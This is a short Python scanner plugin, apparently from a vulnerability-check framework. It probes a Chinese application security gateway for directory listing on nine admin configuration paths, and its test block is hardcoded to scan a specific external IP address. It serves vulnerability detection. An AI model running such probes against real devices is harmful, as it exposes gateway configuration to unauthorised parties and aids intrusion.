#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 远为应用安全网关(&国富安应用安全网关)目录遍历
refer: http://www.wooyun.org/bugs/wooyun-2015-0130878
description:
/adminconfig/
/firewallconfig/
/highconfig/
/ipsecconfig/
/logconfig/
/qosconfig/
/system/
/tools/
/dialconfig/
特征不知道咋写，暂定为yuanwei_wangguan吧
'''

import re
import urlparse


def assign(service, arg):
    if service == 'yuanwei_wangguan':
        return True, arg

def audit(arg):
    urls = [
        arg + 'adminconfig/',
        arg + 'firewallconfig/',
        arg + 'highconfig/',
        arg + 'ipsecconfig/',
        arg + 'logconfig/',
        arg + 'qosconfig/',
        arg + 'system/',
        arg + 'tools/',
        arg + 'dialconfig/'
    ]
    for url in urls:
        code, head, res, err, _ = curl.curl2(url)
        if (code == 200) and ('<h1>Index of' in res):
            security_hole('List of directory' + url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yuanwei_wangguan','http://222.170.47.230:8888/')[1])